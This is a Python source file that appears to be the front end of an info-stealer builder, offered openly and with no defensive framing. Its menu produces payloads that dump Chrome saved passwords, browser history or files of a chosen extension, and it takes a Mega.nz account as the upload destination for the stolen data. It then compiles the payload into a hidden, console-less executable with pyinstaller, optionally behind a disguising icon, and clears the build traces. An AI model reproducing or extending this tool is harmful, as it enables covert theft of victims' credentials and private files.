

# -*- coding: utf-8 -*-
# Author: Abdulrahman Mohammed (De3vil)
# Don't touch my code, it's art 
#+==============================

from modules_virsion2.Moud import buildHis  , buildpass , Files
from modules_virsion2.Banar_color import ascii_txt
from modules_virsion2.Banar_color.ascii_txt import merry , WI , W ,Y, B , M ,Q , G , R , X , Z  ,bl , txt , txt1 , cheeksystem
from os import system , remove 
from shutil import rmtree
from sys import exit
try:
	system("cls")
	merry()
	cheeksystem()
except Exception as e:
	print(e)
class Run:
	def __init__(self):
		self.ch1 = "1"
		self.ch2 = "2"
		self.ch3 = "3"
		self.ch4 = ""
		self.filenampackeg = ""
		pass
	def choose(self,spaces0=3,spaces1=7):
		spaces0 = " " *spaces0
		spaces1 = " " *spaces1
		print(spaces0+f"{WI}[{bl}1{WI}] {X}dump_passwords"+'\n'+spaces0+f"{WI}[{bl}2{WI}] {X}dump_History"+"\n"+spaces0+f"{WI}[{bl}3{WI}] {X}dump_Files")
		try:
			self.chose = self.colored_input("choose",spaces=4)
			if self.chose == self.ch1:
				self.mido =  Run()
				self.filenampackeg = "dump_Password.py"
				print(self.spaces*2+X+"|")
				print(spaces1+f"{WI}[{X}1{WI}]{X}Chrome")
				print(self.spaces*2+X+"|")
				print(txt1)
				mido.getdatefromuser()
				self.build_password()
				mido.packing()
			if self.chose == self.ch2:
				self.mido =  Run()
				self.filenampackeg = "dump_History.py"
				mido.getdatefromuser()
				self.build_hsistory()
				mido.packing()
			if self.chose == self.ch3:
				self.mido =  Run()
				self.filenampackeg = "dump_Files.py"
				print(self.spaces*2+X+"|")
				print(X+txt)
				self.extension = self.colored_input("set extension" , spaces=8)
				mido.getdatefromuser()
				self.dum_files()
				mido.packing()
			if self.chose != (
				self.ch1 
				or self.ch2 
				or self.ch3
				):
				self.Backtomenu()

			else:
				exit(0)
		except Exception as e:
			print(e)
			exit(0)
	def colored_input(self,title="menu",spaces=3):
		self.spaces = " "*spaces
		print(G+self.spaces+"║")
		line = G+self.spaces+"╚══["+R+"Stealing"+G+"]──["+R+"~"+G+"]─["+B+title+G+"]"+X+":"+WI
		try:
			return input(line)
		except KeyboardInterrupt:
			exit(0)
	def rem_ove(self):
		try:
			self.file 	  = self.filenampackeg.split(".")[-2]
			self.dum_file = self.file+".spec"
			self.rm_fl 	  = remove(self.filenampackeg)
			self.rm_fl 	  = remove(self.dum_file)
			rmtree("__pycache__", ignore_errors=True)
			rmtree("build", ignore_errors=True)
		except Exception as e:
			print(e)
	def getdatefromuser(self,spaces=3):
		self.email    = self.colored_input("Email Mega'https://mega.nz/",spaces=8)
		self.Password = self.colored_input("password Mega'https://mega.nz/" ,spaces=8)
	def CompilinG(self,title_ico="CompilinG Start"):
		print(X+"║")
		print(X+"╚══["+R+"Stealing"+X+"]──["+R+"~"+X+"]─["+R+title_ico+X+"] "+WI)
		system(f"pyinstaller --onefile --noconsole {self.filenampackeg}")
		self.rem_ove()
		system("cls")
		merry()
		self.choose()
	def CompilinG_icon(self,title_ico="CompilinG Start"):
		self.icon = self.colored_input(X+f"Set Your icon File",spaces=12)
		print(X+"║")
		print(X+"╚══["+R+"Stealing"+B+"]──["+R+"~"+X+"]─["+R+title_ico+X+"]: "+WI)
		system(f"pyinstaller --onefile --noconsole --icon={self.icon} {self.filenampackeg}")
		self.rem_ove()
		system("cls")
		merry()
		self.choose()
	def packing(self):
		self.compiling = self.colored_input(X+f"{B}compiling {WI}({X}Py{WI}) {B}file to {WI}({X}ExE{WI}) {WI}({X}y {WI}&& {R}n{WI}){WI}",spaces=12)
		if self.compiling == "y" or self.compiling == "Y":
			self.ico = self.colored_input(X+f"{B}You want set {X}icon ? {WI}({X}y {WI}&& {R}n{WI}){WI}",spaces=12)
			if self.ico == "y" or self.ico == "Y":
				self.CompilinG_icon()
			else:
				self.CompilinG()
		else:
			system("cls")
			merry()
			self.choose()	
		if self.compiling == "n" or self.compiling == "N":
			self.CompilinG()
		else:
			exit(0)
	def build_hsistory(self):
		buildHis.build_hs(email=mido.email, Password=mido.Password)
	def build_password(self):
		buildpass.build_pass(email=mido.email, Password=mido.Password)
	def dum_files(self):
		Files.build_Fs(email=mido.email, Password=mido.Password , extension=self.extension)
	def Backtomenu(self):
		system("cls")
		merry()
		self.choose()




mido = Run()
mido.choose()